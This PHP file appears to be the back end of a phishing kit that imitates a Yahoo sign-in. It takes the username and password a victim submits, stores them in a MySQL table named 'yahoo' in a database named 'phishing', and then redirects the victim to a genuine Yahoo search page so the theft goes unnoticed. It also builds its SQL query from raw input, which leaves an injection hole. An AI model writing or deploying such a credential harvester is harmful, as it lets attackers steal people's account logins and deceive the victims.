<?php
$server = "localhost";
$username = "root";
$password = "";
$dbname = "phishing";

$con = mysqli_connect($server, $username, $password, $dbname);

if (!$con) {
    echo "Connection failed";
}

$name = $_POST['username'];
$pass = $_POST['passwd'];

$sql = "INSERT INTO `yahoo`(`username`, `password`) VALUES ('$name','$pass')";
$result = mysqli_query($con, $sql);
if ($result) {
    header('Location: https://in.search.yahoo.com/?fr2=inr');
} else {
    echo "Data not inserted";
}
